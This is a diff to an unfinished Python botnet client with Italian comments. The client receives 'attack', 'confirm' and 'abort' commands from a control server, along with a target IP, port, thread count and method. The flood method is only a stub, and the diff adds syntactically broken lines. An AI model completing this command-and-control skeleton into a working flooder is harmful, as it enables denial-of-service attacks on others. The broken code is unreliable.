@@ -2,7 +2,10 @@ import socket
 import threading
 
 # Dati target
-TYPE, IP, PORT , THREADS, METHOD = "", 0, 0, 0, ""
+TYPE, IP, PORT, THREADS, METHOD = "", "", 0, 0, ""
+
+THREADS_LIST = []
+
 class ThreadManager:
     def __init__(self):
         self.threads = []
@@ -43,6 +46,11 @@ class CustomThread(threading.Thread):
 
 
 class Attack:
+    
+    tm = ThreadManager.__init__()
+    
+    def init(str(attack_method), int())
+    
     def TCP_FLOOD():
         pass
 
@@ -53,13 +61,16 @@ def receive_messages_from_server(client_socket):
         message = client_socket.recv(1024).decode('utf-8')
 
         # Se il messaggio è vuoto, il server si è disconnesso
-        if not message:
+        if message == "terminate":
             print("Il server si è disconnesso.")
             break
         
-        TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
+        TYPE = message.split(" ")[0]
         
         if TYPE == "attack":
+            
+            TYPE, IP, PORT, THREADS, METHOD = message.split(" ")
+            
             print(f"""
                 Dati attacco:
                 IP: {IP}
@@ -69,7 +80,7 @@ def receive_messages_from_server(client_socket):
                 """)
         elif TYPE == "confirm":
             print("confirm") # TODO ingaggiare l'attacco
-        elif TYPE == "abort":
+        elif TYPE ==  "abort":
             print("Terminating attack.")
         else:
             pass
